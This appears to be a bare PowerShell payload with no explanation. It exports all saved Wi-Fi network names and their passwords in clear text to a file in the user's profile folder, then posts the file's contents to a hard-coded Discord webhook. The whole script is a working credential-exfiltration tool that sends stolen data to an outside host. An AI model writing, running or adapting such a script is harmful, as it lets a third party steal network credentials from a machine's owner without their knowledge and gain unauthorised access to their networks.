netsh wlan show profile name="*" key=clear > "$env:USERPROFILE\wifipass.txt"
$fileContent = Get-Content "$env:USERPROFILE\wifipass.txt" -Raw
$webhookUrl = "https://discord.com/api/webhooks/1397314423084810250/BKCu31_MoFQOrfWi6ZGFGa7CXbGAcnIqeRfZXDXL7IG2Y0kRN6lYT_fxibN-8fIcBfTN"

$bodyObject = @{
    content = '```' + $fileContent + '```'
}

$jsonPayload = $bodyObject | ConvertTo-Json -Depth 3
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType "application/json"
